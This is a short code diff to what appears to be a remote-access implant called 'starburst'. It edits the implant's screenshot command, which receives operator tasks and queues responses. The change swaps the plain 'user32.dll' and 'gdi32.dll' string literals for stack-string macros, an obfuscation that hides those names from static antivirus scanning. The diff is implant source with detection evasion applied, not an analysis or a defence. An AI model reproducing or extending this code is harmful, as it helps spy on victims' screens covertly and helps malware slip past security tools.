@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_SCREENSHOT
 
@@ -33,8 +34,10 @@ auto declfn starburst::cmd_screenshot(
 ) -> void {
     (void)params;
 
-    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
-    auto h_gdi32  = inst.kernel32.LoadLibraryA( symbol<const char*>( "gdi32.dll" ) );
+    STK_USER32(_n1);
+    STK_GDI32(_n2);
+    auto h_user32 = inst.kernel32.LoadLibraryA( _n1 );
+    auto h_gdi32  = inst.kernel32.LoadLibraryA( _n2 );
 
     if ( !h_user32 || !h_gdi32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
